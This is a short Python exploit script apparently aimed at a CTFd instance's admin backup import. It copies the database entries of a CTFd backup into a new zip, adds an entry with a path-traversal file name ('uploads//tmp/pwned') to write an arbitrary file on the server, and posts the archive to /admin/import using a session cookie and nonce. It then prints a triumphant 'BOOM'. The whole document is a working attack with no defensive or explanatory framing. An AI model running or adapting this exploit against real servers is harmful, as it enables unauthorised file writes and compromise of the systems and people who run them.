import zipfile
import requests
from io import BytesIO
from requests.exceptions import HTTPError

zip_buffer = BytesIO()
URL = "http://localhost"
PORT = ""

def zip_macilious(zipF: str, content: str):
    payload = "uploads//tmp/pwned"

    with zipfile.ZipFile(zipF, 'r') as origin:
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for item in origin.infolist():
                if 'db/' in item.filename:
                    data = origin.read(item.filename)
                    zip_file.writestr(item, data)

            zip_file.writestr(payload, content)

    output = zip_buffer.getvalue()
    with open('macilious.zip', 'wb') as f:
        f.write(output)


def importHandle():
    target = f"{URL}:{PORT}/admin/import"
    zip_file = "macilious.zip"
    cookie = ""
    nonce = ""

    headers = {"Cookie": f"session={cookie}"}
    files = [
        ('backup', (zip_file, open(zip_file, 'rb'), 'application/x-zip-compressed')),
        ('nonce', (None, nonce))
    ]

    try:
        r = requests.post(target, headers=headers, files=files)
        r.raise_for_status()
    except HTTPError as http_err:
        print(f"HTTP error: {http_err}")
    except Exception as err:
        print(f"Other error: {err}")
    else:
        print("BOOMMMMMMMMMMMMMMMMMMMM")



content = "BY SAVEJ204"
zip_macilious('backup_ctfd.zip', content)
importHandle()